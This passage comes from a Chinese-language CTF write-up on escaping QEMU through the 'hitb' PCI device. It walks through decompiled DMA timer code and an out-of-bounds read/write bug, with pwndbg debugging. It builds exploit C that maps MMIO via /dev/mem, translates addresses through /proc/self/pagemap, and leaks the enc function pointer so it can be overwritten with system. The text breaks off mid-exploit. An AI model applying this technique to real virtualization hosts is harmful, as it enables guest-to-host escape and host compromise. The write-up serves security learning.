class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, <span class="number">1</span>);<span class="comment">// 读</span></span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">-36</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst - <span class="number">2824</span>;</span><br><span class="line">      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">3000</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);<span class="comment">// 写</span></span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        opaque-&gt;enc((<span class="keyword">char</span> *)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cnt_low);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)cnt_low);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细分析分支的话可以知道，cmd末位必须是1，根据倒数第二位是0还是1可以分别进入一个读或写的分支，主要是通过<code>cpu_physical_memory_rw</code>这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> is_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  MemTxAttrs_0 v5; <span class="comment">// edx OVERLAPPED</span></span><br><span class="line"></span><br><span class="line">  v5 = (MemTxAttrs_0)<span class="number">1</span>;</span><br><span class="line">  address_space_rw(&amp;address_space_memory, addr, v5, buf, len, is_write != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">MemTxResult __fastcall <span class="title">address_space_rw</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        AddressSpace_0 *as,</span></span></span><br><span class="line"><span class="function"><span class="params">        hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">        MemTxAttrs_0 attrs,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint8_t</span> *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">bool</span> is_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( is_write )</span><br><span class="line">    <span class="keyword">return</span> address_space_write(as, addr, attrs, buf, len);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> address_space_read_full(as, addr, attrs, buf, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的这种QEMU的API函数可以参见QEMU的源码，会比反编译出来的好看很多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="keyword">uint8_t</span> *buf,<span class="keyword">int</span> len, <span class="keyword">int</span> is_write)</span></span>;</span><br></pre></td></tr></table></figure><p>这个函数is_write为1时，读buf到addr，为0时读addr到buf</p><p>而在这个timer函数中，拿读来举例子，由于<code>cnt_low</code>是我们可控的(因为我们可以通过MMIO_WRITE来设置<code>opaque-&gt;dma.src</code>)，进而控制<code>v2</code>,并且这里没有作检查，所以就会有越界读写的漏洞</p><p>那么思路就明确了，我们可以通过泄露<code>system</code>值然后覆写<code>HitbState</code>的<code>enc</code>函数指针,然后调用即可</p><p>我们可以根据<code>hitb_mmio_write</code>以及<code>hitb_mmio_read</code>提供的一系列规则，通过MMIO操作来设置<code>HitbState</code>的一些值，然后在进入特定分支调用timer回调函数进行泄露等操作</p><p>由于没有掐掉符号表，所以在相应地方下断点很容易，调试着看看即可</p><p>比如我可以在<code>hitb_dma_timer</code>上下断点，根据参数rdi确定此时那个HitbState结构体的一些数据</p><p><img src="https://s2.loli.net/2023/05/10/rKTzNMFExetkaHp.png" alt="image-20230510215501898"></p><p>但是有时候打印结果太长，我们只想看部分，此时可以通过set变量然后查看即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="variable">$a</span> = *((HitbState *) (0x555dc0e1d430))</span><br><span class="line">pwndbg&gt; p /x <span class="variable">$a</span>.dma</span><br><span class="line"><span class="variable">$3</span> = &#123;</span><br><span class="line">  src = 0x41000,</span><br><span class="line">  dst = 0x20ee470,</span><br><span class="line">  cnt = 0x8,</span><br><span class="line">  cmd = 0x3</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>第一次写QEMU逃逸的EXP，就一步步分析,然后调试一下</p><p><strong>在练习的过程中动态调试是很重要的，在关键函数处下断点，算偏移之类的</strong></p><p>首先把MMIO，还有虚拟地址到物理地址的一些函数准备好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于漏洞点在hitb_dma_timer,然后我们分析可以知道，要在mmio_write进入的话需要满足addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0，还有便是进去的时候HitbState一些参数需要设置好，主要是<code>src、dst、cnt、cmd</code>等，在mmio_write根据相应分支写相应函数即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*if ( addr == 0x80 )</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">        opaque-&gt;dma.src = val;                  // 设置src</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint32_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">          if ( addr == 0x90 )</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">              opaque-&gt;dma.cnt = val;            // 设置cnt</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        else if ( addr == 0x88 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          opaque-&gt;dma.dst = val;                // 设置dst</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">else if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            opaque-&gt;dma.cmd = val;</span></span><br><span class="line"><span class="comment">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span></span><br><span class="line"><span class="comment">            timer_mod(&amp;opaque-&gt;dma_timer, ns / 1000000 + 100);</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">          */</span></span><br></pre></td></tr></table></figure><p>我们可以通过下断点查看结构体的dma字段的方法来看看我们设置的对不对</p><p>简单测试一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint32_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line">    set_src(<span class="number">0x114</span>);</span><br><span class="line">    set_cnt(<span class="number">0x514</span>);</span><br><span class="line">    set_dst(<span class="number">0x191</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态编译好之后打包，然后下断点调试看看</p><p><img src="https://s2.loli.net/2023/05/10/B7vqFWICmLEVGgn.png" alt="image-20230510222900026"></p><p>在以HitbState结构体指针为参数的函数上下断点得到HitbState地址，这里可以<code>b hitb_mmio_write</code></p><p><img src="https://s2.loli.net/2023/05/10/fW7q4jdzMCX1LEJ.png" alt="image-20230510223116060"></p><p>然后根据刚刚的方法进行<code>set $a = xxx</code> 查看结构体即可</p><p><img src="https://s2.loli.net/2023/05/10/Bw4X5et2FjQ9PhO.png" alt="image-20230510230818098"></p><p>（原来相应成员内存更改之后p/x显示的变量并不会动态更改，还是需要再set一下，调了半天</p><p>那么接下来就是越界读的部分了，由于<code>HitbState</code>存了enc指针，我们可以泄露它，算出<code>.text</code>基址,然后再计算处<code>system@plt</code></p><p>所以就是分析进入<code>hitb_dma_timer</code>分支的操作了，和上面的一样，可以写出从<code>dma_buf</code>数组中拷贝数据到<code>dma.dst</code>上，还有从<code>dma.src</code>写数据到<code>dma_buf</code>数组中。需要注意的是，我们调用的<code>cpu_physical_memory_rw</code>要求地址是物理地址，所以先转换一下。由于减去了 0x40000，这里再加上方便控制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从src拷贝到dst</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_from_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(gva2gpa(dst));</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从dst写到src</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(gva2gpa(src));</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(dst+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后简单动调，先把偏移定成0，之后下断点确定一下enc指针的偏移(或者直接根据结构体确定偏移为4096也行，这样快一点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000B</span>B8 dma_buf db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001B</span>B8 enc dq ?                                ; offset</span><br><span class="line"><span class="number">00001B</span>C0 dma_mask d</span><br></pre></td></tr></table></figure><p>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dst</span><span class="params">(<span class="keyword">uint64_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从src拷贝到dst</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_from_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(gva2gpa(dst));</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从dst写到dma</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(gva2gpa(src));</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(dst+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line">    <span class="comment">// set_cmd();</span></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc;</span><br><span class="line">    copy_from_dma(<span class="number">0</span>,&amp;leak_enc,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak_enc = %p&quot;</span>,leak_enc)</span><br><span class="line"></span><br><span 